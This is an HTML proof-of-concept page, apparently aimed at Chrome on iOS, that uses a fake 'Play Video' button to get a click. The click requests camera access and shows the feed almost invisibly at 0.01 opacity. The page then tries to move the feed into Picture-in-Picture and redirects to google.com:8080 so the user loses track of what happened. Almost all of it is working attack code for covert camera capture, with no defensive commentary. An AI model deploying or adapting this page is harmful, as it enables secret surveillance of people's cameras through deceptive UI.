<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Chrome iOS Camera + PiP PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  background: black;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  overflow: hidden;
}

/* Fake UI */
#overlay {
  position: fixed;
  inset: 0;
  background: black;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 10;
}

#play {
  background: white;
  color: black;
  font-size: 22px;
  padding: 18px 40px;
  border-radius: 14px;
}

/* Camera video */
video {
  position: fixed;
  inset: 0;
  width: 100%;
  height: 100%;
  object-fit: cover;
  opacity: 0.01; /* hampir tidak terlihat */
}
</style>
</head>

<body>

<div id="overlay">
  <div id="play">▶️ Play Video</div>
</div>

<video id="camera" autoplay playsinline muted></video>

<script>
const overlay = document.getElementById('overlay');
const camera  = document.getElementById('camera');

overlay.addEventListener('click', async () => {
  overlay.remove();

  // 1️⃣ Trigger camera permission
  setTimeout(async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      camera.srcObject = stream;

      // 2️⃣ Attempt PiP
      if (document.pictureInPictureEnabled) {
        try {
          await camera.requestPictureInPicture();
        } catch (e) {}
      }
    } catch (e) {}
  }, 80);

  // 3️⃣ Redirect (context loss)
  setTimeout(() => {
    location.href = "https://google.com:8080";
  }, 80);
});
</script>

</body>
</html>
